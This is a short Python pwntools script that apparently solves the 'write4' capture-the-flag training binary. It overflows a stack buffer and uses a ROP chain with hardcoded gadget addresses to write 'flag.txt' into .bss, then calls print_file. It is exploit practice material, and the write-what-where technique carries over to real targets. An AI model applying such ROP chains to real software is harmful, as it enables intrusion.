import pwn

pwn.context(arch='amd64', os='linux', log_level='debug')

p = pwn.process('./write4')
e = pwn.ELF('./write4')
libwrite4 = pwn.ELF('./libwrite4.so')

print_file_addr = pwn.p64(e.plt['print_file'])

bss_addr = e.bss()       # bss addr
pop_rdi_addr = pwn.p64(0x400693)         # pop rdi ; ret
pop_r14_r15_addr = pwn.p64(0x400690)     # pop r14 ; pop r15 ; ret
mov_r15__r14__addr = pwn.p64(0x400628)   # mov %r15, (%r14) ; ret

'''
for k, v in e.sym.items():
    print(k, hex(v))
'''

payload = b'A' * 0x20 + b'B' * 8 + pop_r14_r15_addr + pwn.p64(bss_addr) + b'flag.txt' + mov_r15__r14__addr
payload += pop_r14_r15_addr + pwn.p64(bss_addr + 8) + pwn.p64(0) + mov_r15__r14__addr
payload += pop_rdi_addr + pwn.p64(bss_addr) + print_file_addr + b'RRRR'

p.sendlineafter(b'> ', payload)

p.recv()
